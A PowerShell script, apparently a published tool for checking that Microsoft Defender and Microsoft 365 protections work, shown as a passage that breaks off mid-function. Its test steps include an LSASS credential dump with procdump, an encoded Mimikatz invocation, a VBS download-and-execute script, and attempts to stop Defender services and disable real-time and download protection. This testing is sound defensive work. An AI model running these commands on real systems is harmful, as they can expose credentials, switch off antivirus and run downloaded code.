param(                        
    [switch]$debug = $false,    ## if -debug parameter don't prompt for input
    [switch]$noprompt = $false   ## if -noprompt parameter used don't prompt user for input
)
<# CIAOPS
Script provided as is. Use at own risk. No guarantees or warranty provided.

Description - Perform security tests in your environment
Source - https://github.com/directorcia/Office365/blob/master/sec-test.ps1
Documentation - https://blog.ciaops.com/2021/06/29/is-security-working-powershell-script/
Video wlak through - https://www.youtube.com/watch?v=Cq0tj6kfSBo
Resources - https://demo.wd.microsoft.com/

Prerequisites = Windows 10, OFfice, valid Microsoft 365 login, endpoint security

#>

#Region Variables
$systemmessagecolor = "cyan"
$processmessagecolor = "green"
$errormessagecolor = "red"
$warningmessagecolor = "yellow"
#EndRegion Variables

function displaymenu($mitems) {
    $mitems += [PSCustomObject]@{
        Number = 1;
        Test = "Download EICAR file"
    }
    $mitems += [PSCustomObject]@{
        Number = 2;
        Test = "Create EICAR file in current directory"
    }
    $mitems += [PSCustomObject]@{
        Number = 3;
        Test = "Create malware in memory"
    }
    $mitems += [PSCustomObject]@{
        Number = 4;
        Test = "Attempt LSASS process dump"
    }
    $mitems += [PSCustomObject]@{
        Number = 5;
        Test = "Mimikatz test"
    }
    $mitems += [PSCustomObject]@{
        Number = 6;
        Test = "Generate failed Microsoft 365 login"
    }
    $mitems += [PSCustomObject]@{
        Number = 7;
        Test = "Office applications creating child processes"
    }
    $mitems += [PSCustomObject]@{
        Number = 8;
        Test = "Office applications creating executables"
    }
    $mitems += [PSCustomObject]@{
        Number = 9;
        Test = "Impede Javascript and VBScript launch executables"
    }
    $mitems += [PSCustomObject]@{
        Number = 10;
        Test = "Block Win32 imports from Macro code in Office"
    }
    $mitems += [PSCustomObject]@{
        Number = 11;
        Test = "Block Process Creations originating from PSExec & WMI commands"
    }
    $mitems += [PSCustomObject]@{
        Number = 12;
        Test = "Block VBS script to download then execute"
    }
    $mitems += [PSCustomObject]@{
        Number = 13;
        Test = "Network protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 14;
        Test = "Suspicious web page (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 15;
        Test = "Phishing web page (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 16;
        Test = "Block download on reputation (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 17;
        Test = "Browser exploit protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 18;
        Test = "Mailcious browser frame protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 19;
        Test = "Unknown program protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 20;
        Test = "Known malicious program protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 21;
        Test = "Potentially unwanted application protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 22;
        Test = "Block at first seen (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 23;
        Test = "Check Windows Defender Services"
    }
    $mitems += [PSCustomObject]@{
        Number = 24;
        Test = "Check Windows Defender Configuration"
    }
    $mitems += [PSCustomObject]@{
        Number = 25;
        Test = "Check MSHTA script launch"
    }
    $mitems += [PSCustomObject]@{
        Number = 26;
        Test = "Squiblydoo attack"
    }
    $mitems += [PSCustomObject]@{
        Number = 27;
        Test = "Block Certutil download"
    }
    $mitems += [PSCustomObject]@{
        Number = 28;
        Test = "Block WMIC process launch"
    }
    $mitems += [PSCustomObject]@{
        Number = 29;
        Test = "Block RUNDLL32 process launch"
    }
    $mitems += [PSCustomObject]@{
        Number = 30;
        Test = "PrintNightmare/Mimispool"
    }
    $mitems += [PSCustomObject]@{
        Number = 31;
        Test = "HiveNightmare/CVE-2021-36934"
    }
    $mitems += [PSCustomObject]@{
        Number = 32;
        Test = "MSHTML/CVE-2021-40444"
    }
    $mitems += [PSCustomObject]@{
        Number = 33;
        Test = "Forms 2.0 HTML controls"
    }
    $mitems += [PSCustomObject]@{
        Number = 34;
        Test = "Word document Backdoor drop"
    }
    $mitems += [PSCustomObject]@{
        Number = 35;
        Test = "PowerShell script in fileless attack"
    }
    $mitems += [PSCustomObject]@{
        Number = 36;
        Test = "Dump credentials using SQLDumper.exe"
    }
    $mitems += [PSCustomObject]@{
        Number = 37;
        Test = "Dump credentials using COMSVCS"
    }
    $mitems += [PSCustomObject]@{
        Number = 38;
        Test = "Mask Powershell.exe as Notepad.exe"
    }
    $mitems += [PSCustomObject]@{
        Number = 39;
        Test = "Create scheduled tasks"
    }

    return $mitems
}

function downloadfile() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 1. Download EICAR file ---"
    $dldetect=$true
    write-host -foregroundcolor $processmessagecolor "Download eicar.com.txt file to current directory"
    if (Test-Path -Path .\eicar.com.txt -PathType Leaf) {
        write-host -foregroundcolor $processmessagecolor "Detected existing eicar.com.txt file in current directory."
        Remove-Item .\eicar1.com.txt
        write-host -foregroundcolor $processmessagecolor "Delected previous eicar.com.txt version in current directory."
    }
    Invoke-WebRequest -Uri https://secure.eicar.org/eicar.com.txt -OutFile .\eicar.com.txt
    write-host -foregroundcolor $processmessagecolor "Verify eicar.com.txt file in current directory"
    try {
        read-content .\eicar.com.txt
    }
    catch {
        write-host -foregroundcolor $processmessagecolor "eicar.com.txt file download not found - test SUCCEEDED"
        $dldetect=$false
    }
    if ($dldetect) {
        write-host -foregroundcolor $warningmessagecolor "eicar.com.txt file download found - test FAILED"
        $dlexist = $true
        try {
            $dlsize = (Get-ChildItem ".\eicar.com.txt").Length
        }
        catch {
            $dlexist = $false
            write-host -foregroundcolor $processmessagecolor "eicar.com.txt download not found - test SUCCEEDED"
        }
        if ($dlexist) {
            if ($dlsize -ne 0) {
                write-host -foregroundcolor $errormessagecolor "eicar.com.txt download file length > 0 - test FAILED"
            }
        }
    }
}
function createfile(){
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 2. Create EICAR file in current directory ---"
    set-content .\eicar1.com.txt:EICAR "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    write-host -foregroundcolor $processmessagecolor "Attempt eicar1.com.txt file creation from memory"   
    $crdetect = $false
    write-host -foregroundcolor $processmessagecolor "Check Windows Defender logs for eicar1 report"
    $results = get-mpthreatdetection | sort-object initialdetectiontime -Descending
    $item = 0
    foreach ($result in $results) {
        if ($result.actionsuccess -and ($result.resources -match "eicar1")) {
            ++$item
            write-host "`nItem =",$item
            write-host "Initial detection time =",$result.initialdetectiontime
            write-host "Process name =",$result.processname
            write-host -foregroundcolor $processmessagecolor "Resource = ",$result.resources
            $crdetect = $true
        }
    }
    if ($crdetect) {
        write-host -foregroundcolor $processmessagecolor "`nEICAR file creation detected - test SUCCEEDED"
    }
    else {
        write-host -foregroundcolor $errormessagecolor "`nEICAR file creation not detected - test FAILED"
    }
    $crdetect = $true
    try {
        $fileproperty = get-itemproperty .\eicar1.com.txt
    }
    catch {
        write-host -foregroundcolor $processmessagecolor "eicar1.com.txt file not detected - test SUCCEEDED"
        $crdetect = $false
    }
    if ($crdetect) {
        if ($fileproperty.Length -eq 0) {
            write-host -foregroundcolor $processmessagecolor "eicar1.com.txt detected with file size = 0 - test SUCCEEDED"
            write-host -foregroundcolor $processmessagecolor "Removing file .\EICAR1.COM.TXT"
            Remove-Item .\eicar1.com.txt
        }
        else {
            write-host -foregroundcolor $errormessagecolor "eicar1.com.txt detected but file size is not 0 - test FAILED"
        }
    }
}

function inmemorytest(){
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 3. In memory test ---"
    $memdetect = $false
    $errorfile = ".\sec-test-$(get-date -f yyyyMMddHHmmss).txt"     # unique output file
    $s1 = "AMSI Test Sample: 7e72c3ce"             # first half of EICAR string
    $s2 = "-861b-4339-8740-0ac1484c1386"           # second half of EICAR string
    $s3=($s1+$s2)                                  # combined EICAR string in one variable
    $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s3)) # need to encode command so not detected and block in this script
    write-host -foregroundcolor $processmessagecolor "Launch Powershell child process to output EICAR string to console"
    Start-Process powershell -ArgumentList "-EncodedCommand $encodedcommand" -wait -WindowStyle Hidden -redirectstandarderror $errorfile
    write-host -foregroundcolor $processmessagecolor "Attempt to read output file created by child process"
    try {
        $result = get-content $errorfile -ErrorAction Stop        # look at child process error output
    }
    catch {     # if unable to open file this is because EICAR strng found in there
        write-host -foregroundcolor $processmessagecolor "In memory malware creation blocked - test SUCCEEDED"
        write-host -foregroundcolor $processmessagecolor "Removing file $errorfile"
        remove-item $errorfile      # remove child process error output file
        $memdetect = $true          # set detection state = found
    }
    if (-not $memdetect) {
        write-host -foregroundcolor $errormessagecolor "In memory test malware creation not block - test FAILED"
        write-host -ForegroundColor $errormessagecolor "Recommended action = review file $errorfile"
    }
}

function processdump() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 4. Attempt LSASS process dump ---"
    $result = test-path ".\procdump.exe"
    $procdump = $true
    if (-not $result) {
        write-host -foregroundcolor $warningmessagecolor "SysInternals procdump.exe not found in current directory"
        if ($noprompt) {        # if running the script with no prompting
            do {
                $result = Read-host -prompt "Download SysInternals procdump (Y/N)?"
            } until (-not [string]::isnullorempty($result))
        }
        else {
            $result = 'Y'
        }
        if ($result -eq 'Y' -or $result -eq 'y') {
            write-host -foregroundcolor $processmessagecolor "Download procdump.zip to current directory"
            invoke-webrequest -uri https://download.sysinternals.com/files/Procdump.zip -outfile .\procdump.zip
            write-host -foregroundcolor $processmessagecolor "Expand procdump.zip file to current directory"
            Expand-Archive -LiteralPath .\procdump.zip -DestinationPath .\ -Force
            $result = test-path ".\procdump.exe"
            if ($result) {
                write-host -foregroundcolor $processmessagecolor "procdump.exe found in current directory"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "procdump.exe not found in current directory"
                $procdump = $false
            }
        }
        else {
            $procdump = $false
        }
    }
    if ($procdump) {
        $accessdump = $true
        try {
            write-host -nonewline -foregroundcolor $processmessagecolor "Attempt process dump in current user context = "
            $result = .\procdump.exe -mm lsass.exe lsass.dmp -accepteula    
        }
        catch {
            if ($error[0] -match "Access is denied") {
                write-host -foregroundcolor $processmessagecolor "Access denied - Unable to process dump in current user context - test SUCCEEDED"
                $accessdump = $false
            }
            else {
                write-host -foregroundcolor $processmessagecolor $error[0]
            }
        }
        if ($result -match "Access is denied") {
            write-host -foregroundcolor $processmessagecolor "Access denied - Unable to process dump in current user context - test SUCCEEDED"
            $accessdump = $false
        }
        else {
            $result = test-path ".\lsass.dmp"
            if ($result) {
                write-host -foregroundcolor $errormessagecolor "Dump file found - test FAILED"
                $accessdump = $true
                write-host -foregroundcolor $processmessagecolor "Removing dump file .\LSASS.DMP"
                Remove-Item ".\lsass.dmp"
            }
        }
        try {
            write-host -nonewline -foregroundcolor $processmessagecolor "Attempt process dump in admin context = "
            $error.Clear()      # Clear any existing errors
            start-process -filepath ".\procdump.exe" -argumentlist "-mm -o lsass.exe lsass.dmp" -verb runas -wait -WindowStyle Hidden
        }
        catch {
            if ($error[0] -match "Access is denied") {
                write-host -foregroundcolor $processmessagecolor "Access denied - Unable to process dump in admin context - test SUCCEEDED"
                $accessdump = $false
            }
        }
        $result = test-path ".\lsass.dmp"
        if ($result) {
            write-host -foregroundcolor $errormessagecolor "Dump file found - test FAILED"
            $accessdump = $true
            write-host -foregroundcolor $processmessagecolor "Removing dump file .\LSASS.DMP"
            Remove-Item ".\lsass.dmp"
        }
        if ($accessdump) {
            write-host -foregroundcolor $errormessagecolor "Able to process dump or other error - test FAILED"
        }
    }
}

function mimikatztest() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 5. Mimikatz test ---"
    $errorfile = ".\sec-test-$(get-date -f yyyyMMddHHmmss).txt"     # unique output file
    $s1 = "invoke-"             # first half of command
    $s2 = "mimikatz"           # second half of command
    $s3=($s1+$s2)                                  # combined EICAR string in one variable
    $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s3)) # need to encode command so not detected and block in this script
    write-host -foregroundcolor $processmessagecolor "Launch Powershell child process to output Mimikatz command string to console"
    Start-Process powershell -ArgumentList "-EncodedCommand $encodedcommand" -wait -WindowStyle Hidden -redirectstandarderror $errorfile
    write-host -foregroundcolor $processmessagecolor "Attempt to read output file created by child process"
    try {
        $result = get-content $errorfile -ErrorAction Stop        # look at child process error output
    }
    catch {     # if unable to open file this is because EICAR strng found in there
        write-host -foregroundcolor $errormessagecolor "[ERROR] Output file not found"
    }
    if ($result -match "This script contains malicious content and has been blocked by your antivirus software") {
        write-host -ForegroundColor $processmessagecolor "Malicious content and has been blocked by your antivirus software - test SUCCEEDED"
        remove-item $errorfile      # remove child process error output file
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Malicious content NOT DETECTED = review file $errorfile - test FAILED"
    }   
}

function failedlogin() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 6. Generate Microsoft 365 failed login ---"
    do {
        $username = Read-host -prompt "Enter valid Microsoft 365 email address to generate failed login"
    } until (-not [string]::isnullorempty($username))
    $password="1"
    $URL = "https://login.microsoft.com"
    $BodyParams = @{"resource" = "https://graph.windows.net"; "client_id" = "1b730954-1685-4b74-9bfd-dac224a7b894" ; "client_info" = "1" ; "grant_type" = "password" ; "username" = $username ; "password" = $password ; "scope" = "openid"}
    $PostHeaders = @{"Accept" = "application/json"; "Content-Type" =  "application/x-www-form-urlencoded"}
    try {
        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr
    } 
    catch {
        switch -wildcard ($RespErr)
        {
            "*AADSTS50126*" {write-host -foregroundcolor $processmessagecolor "Error validating credentials due to invalid username or password as expected - check your logs"; break}
            "*AADSTS50034*" {write-host -foregroundcolor $warningmessagecolor "User $username doesnt exist"; break}
            "*AADSTS50053*" {write-host -foregroundcolor $warningmessagecolor "User $username appears to be locked"; break}
            "*AADSTS50057*" {write-host -foregroundcolor $warningmessagecolor "User $username appears to be disabled"; break}
            default {write-host -foregroundcolor $warningmessagecolor "Unknown error for user $username"}
        }
    }
}

function officechildprocess() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 7. Office applications creating child processes ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
    Invoke-WebRequest -Uri https://demo.wd.microsoft.com/Content/TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm -OutFile .\TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm
    write-host -foregroundcolor $processmessagecolor "Open document using Word"
    Start-Process winword.exe -ArgumentList ".\TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm"
    write-host "`n1. Ensure that a Run Time Error is displayed."
    write-host "2. Please close Word once complete.`n"
    write-host -foregroundcolor $warningmessagecolor "If Command Prompt opens, then the test has FAILED`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete .\TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm"
    remove-item .\TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm  
}

function officecreateexecutable() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 8. Office applications creating executables ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
    Invoke-WebRequest -Uri https://demo.wd.microsoft.com/Content/TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm -OutFile .\TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm
    write-host -foregroundcolor $processmessagecolor "Open document using Word"
    Start-Process winword.exe -ArgumentList ".\TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm"
    write-host "`n1. Ensure that no executable runs."
    write-host "2. A macro error/warning should be displayed"
    write-host "3. Please close Word once complete.`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm"
    remove-item .\TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm  
}

function scriptlaunch() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 9. Impede Javascript and VBScript launch executables ---"
    write-host -foregroundcolor $processmessagecolor "Create DLTEST.JS file in current directory"
    $body = @"
// SCPT:xmlHttpRequest
var xmlHttp = WScript.CreateObject("MSXML2.XMLHTTP");
xmlHttp.open("GET", "https://www.bing.com", false);
xmlHttp.send();

// SCPT:JSRunsFile
var shell = WScript.CreateObject("WScript.Shell");
shell.Run("notepad.exe");
"@
    set-content -Path .\dltest.js $body
    write-host -foregroundcolor $processmessagecolor "Execute DLTEST.JS file in current directory"
    start-process .\dltest.js
    write-host "1. A Windows Script Host error dialog box should have appeared."
    write-host "2. It should read:`n"
    write-host "    Error: This script is blocked by IT policy"
    write-host "    Code: 800A802E`n"
    write-host -foregroundcolor $warningmessagecolor "If NOTEPAD is executed, then the test has FAILED`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete DLTEST.JS"
    remove-item .\dltest.js  

}

function officemacroimport() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 10. Block Win32 imports from Macro code in Office ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
    Invoke-WebRequest -Uri https://demo.wd.microsoft.com/Content/Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm -OutFile .\Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm
    write-host -foregroundcolor $processmessagecolor "Open document using Word"
    Start-Process winword.exe -ArgumentList ".\Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm"
    write-host "`n1. Ensure that no macros runs and a warning appears." 
    write-host "2. Close Word once complete.`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm"
    remove-item .\Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm  
}

function psexecwmicreation() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 11. Block Process Creations originating from PSExec & WMI commands ---"
    write-host -foregroundcolor $processmessagecolor "Create DLTEST.VBS file in current directory"

    $body = @"
on error resume next
set process = GetObject("winmgmts:Win32_Process")
WScript.Echo "Executing notepad"
result = process.Create ("notepad.exe",null,null,processid)
WScript.Echo "Method returned result = " & result
WScript.Echo "Id of new process is " & processid
"@
    set-content -Path .\dltest.vbs $body
    write-host -foregroundcolor $processmessagecolor "Execute DLTEST.VBS file in current directory"
    start-process .\dltest.vbs
    write-host "`n1. NOTEPAD should NOT run."
    write-host "2. A dialog should appear that says - Executing notepad"
    write-host "3. After you press OK button, dialog should say - Method returned result = 2"
    write-host "4. After you press OK button again, should say - Id of new process is"
    write-host "5. There should be NO number displayed in this dialog box"
    write-host "6. Press OK button to end test`n"
    write-host -foregroundcolor $warningmessagecolor "If NOTEPAD executed and/or there is a Process Id number displayed, the test has FAILED`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete DLTEST.VBS"
    remove-item .\dltest.vbs  
}

function scriptdlexecute() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 12. Block VBS script to download then execute ---"
    write-host -foregroundcolor $processmessagecolor "Create DLTEST2.VBS file in current directory"

    $body = @"
Dim objShell
Dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe", False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile "c:\temp\putty.exe", 2
end with
Set objShell = WScript.CreateObject( "WScript.Shell" )
objShell.Exec("c:\temp\putty.exe")
"@

    set-content -Path .\dltest2.vbs $body
    write-host -foregroundcolor $processmessagecolor "Execute DLTEST2.VBS file in current directory"
    start-process .\dltest2.vbs
    write-host "`n1. PUTTY.EXE should NOT run."
    write-host "2. A dialog should appear that says`n"
    write-host "    Error: Write to file failed"
    write-host "    Code: 800A0BBC`n"
    write-host "3. Press OK button to end test`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete DLTEST2.VBS"
    remove-item .\DLTEST2.vbs
    write-host -foregroundcolor $processmessagecolor "Check for PUTTY.EXE in current directory"
    $result = test-path ".\putty.exe"
    if ($result) {
        write-host -foregroundcolor $errormessagecolor "PUTTY.EXE found - test FAILED`n"
        write-host -foregroundcolor $processmessagecolor "Delete PUTTY.EXE"
        remove-item .\putty.exe
    }
    else {
        write-host -foregroundcolor $processmessagecolor "PUTTY.EXE not found - test SUCCEEDED`n"
    }     
}

function networkprotection() {
    $npdetect = $false
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 13. Network protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://smartscreentestratings2.net/"
    try {
        $result = Invoke-WebRequest -Uri https://smartscreentestratings2.net/ 
    }
    catch {
        if ($error[0] -match "The remote name could not be resolved") {
            write-host -foregroundcolor $processmessagecolor "The remote name could not be resolved: smartscreentestratings2.net - test SUCCEEDED" 
        }
        else {
            write-host -foregroundcolor $errormessagecolor "Site resolved - test Failed"
        }
        $npdetect=$true
    }
    if (-not $npdetect) {
        write-host -foregroundcolor $errormessagecolor "Navigation permitted - test FAILED"
    }
}

function suspiciouspage() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 14. Suspicious web page (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/other/areyousure.html"
    start-process -filepath https://demo.smartscreen.msft.net/other/areyousure.html 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should indicate security issues with the page`n"
    pause
}

function phishpage() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 15. Phishing web page (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/phishingdemo.html"
    start-process -filepath https://demo.smartscreen.msft.net/phishingdemo.html 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should indicate security issues with the page and be reported as unsafe`n"
    pause
}

function downloadblock() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 16. Block download on reputation (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/download/malwaredemo/freevideo.exe"
    start-process -filepath https://demo.smartscreen.msft.net/download/malwaredemo/freevideo.exe 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should indicate security issues with the page and be reported as unsafe`n"
    write-host -foregroundcolor $warningmessagecolor "You should be UNABLE to download and save a file from browser to local workstation`n"
    pause
}

function exploitblock() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 17. Browser exploit protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/other/exploit.html"
    start-process -filepath https://demo.smartscreen.msft.net/other/exploit.html 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should indicate security issues with the page and be reported as unsafe`n"
    pause
}

function maliciousframe() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 18. Mailcious browser frame protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/other/exploit_frame.html"
    start-process -filepath https://demo.smartscreen.msft.net/other/exploit_frame.html 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should indicate security issues with a frame in the page and be reported as unsafe`n"
    pause
}

function unknownprogram() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 19. Unknown program protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/download/unknown/freevideo.exe"
    start-process -filepath https://demo.smartscreen.msft.net/download/unknown/freevideo.exe 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should warn that file blocked because it could harm your device`n"
    write-host -foregroundcolor $warningmessagecolor "You should be UNABLE to download and save a file from browser to local workstation`n"
    pause
}

function knownmalicious() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 20. Known malicious program protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/download/known/knownmalicious.exe"
    start-process -filepath https://demo.smartscreen.msft.net/download/known/knownmalicious.exe 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should warn that file blocked because it it is malicious`n"
    write-host -foregroundcolor $warningmessagecolor "You should be UNABLE to download and save a file from browser to local workstation`n"
    pause
}

function pua() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 21. Potentially unwanted application protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL http://amtso.eicar.org/PotentiallyUnwanted.exe"
    start-process -filepath http://amtso.eicar.org/PotentiallyUnwanted.exe 
    write-host "`n1. Your default browser should open"
    write-host "2. Should not be able to reach this site or download the file`n"
    write-host -foregroundcolor $warningmessagecolor "You should be UNABLE to download and save a file from browser to local workstation`n"
    pause
}

function blockatfirst() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 22. Block at first seen (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL"
    start-process -filepath https://demo.wd.microsoft.com/page/BAFS
    write-host "`n1. Your default browser should open"
    write-host "2. Select the Create and download new file button"
    write-host "3. You will need to login to a Microsoft 365 tenant"
    write-host "4. You will need to provide app permissions to Microsoft Defender app for user`n"
    write-host -foregroundcolor $warningmessagecolor "You should be UNABLE to download and save a file from browser to local workstation`n"
    pause
}

function servicescheck() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 23. Check Windows Defender Services ---"
    $result = get-service SecurityHealthService
    if ($result.status -ne "Running") {
        write-host -ForegroundColor $errormessagecolor "Windows Security Server Service is not running"
    }
    else {
        write-host -ForegroundColor $processmessagecolor "Windows Security Server Service is running"
        write-host -ForegroundColor $processmessagecolor -nonewline "- Attempt to stop Windows Security Server Service has "
        $servicestop = $true
        try {
            $result = stop-service SecurityHealthService -ErrorAction Stop
        }
        catch {
            write-host -ForegroundColor $processmessagecolor "failed"
            $servicestop = $false
        }
        if ($servicestop) {
            write-host -ForegroundColor $errormessagecolor "SUCCEEDED"
            write-host -ForegroundColor $errormessagecolor "- Starting Windows Sercurity Server Service"
            start-service SecurityHealthService -ErrorAction Stop
        }
    }
    $result = get-service WinDefend
    if ($result.status -ne "Running") {
        write-host -ForegroundColor $errormessagecolor "Microsoft Defender Antivirus Service is not running"
    }
    else {
        write-host -ForegroundColor $processmessagecolor "Microsoft Defender Antivirus Service is running"
        write-host -ForegroundColor $processmessagecolor -nonewline "- Attempt to stop Microsoft Defender Antivirus Service has "
        $servicestop = $true
        try {
            $service = "windefend"
            $result = stop-service $service -ErrorAction Stop
        }
        catch {
            write-host -ForegroundColor $processmessagecolor "failed"
            $servicestop = $false
        }
        if ($servicestop) {
            write-host -ForegroundColor $errormessagecolor "SUCCEEDED"
            write-host -ForegroundColor $errormessagecolor "- Starting Microsoft Defender Antivirus Service"
            start-service windefend -ErrorAction Stop
        }
    }
}

function defenderstatus() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 24. Check Windows Defender Configuration ---"
    write-host -ForegroundColor $processmessagecolor "Get Windows Defender configuration settings"
    $result = get-mppreference

    if (-not $result.DisableRealtimeMonitoring) {
        write-host -ForegroundColor $processmessagecolor "Real Time Monitoring is enabled"
        write-host -nonewline -ForegroundColor $processmessagecolor "- Attempt to disable Real Time Monitoring has "
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction stop
            $rtm = (get-mppreference).disablerealtimemonitoring
            if (-not $rtm) {
                write-host -ForegroundColor $processmessagecolor "failed"
            }
            else {
                write-host -ForegroundColor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling Real Time Monitoring"
                Set-MpPreference -DisableRealtimeMonitoring $false
            }
    
        }
        catch {
            write-host -ForegroundColor $processmessagecolor "failed"
        }
    }
    else {
        write-host -ForegroundColor $errormessagecolor "Real Time monitoring is disabled"
    }
    
    if (-not $result.DisableIntrusionPreventionSystem) {
        write-host -foregroundcolor $processmessagecolor "Intrusion Prevention System is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable Intrusion Prevention System has "
        try {
            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction stop
            $rtm = (get-mppreference).DisableIntrusionPreventionSystem
        if (-not $rtm) {
            write-host -foregroundcolor $processmessagecolor "failed"
        }
        else {
            write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
            write-host -foregroundcolor $processmessagecolor "- Re-enabling Intrusion Prevention System"
            Set-MpPreference -DisableIntrusionPreventionSystem $false
        }
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }        
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Intrusion Prevention System is disabled"
    }
    
    if (-not $result.DisableIOAVProtection) {
        write-host -foregroundcolor $processmessagecolor "All downloads and attachments protection is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable all download and attachments protection has "
        try {
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction stop
            $rtm = (get-mppreference).DisableIOAVProtection
            if (-not $rtm) {
                write-host -foregroundcolor $processmessagecolor "failed"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
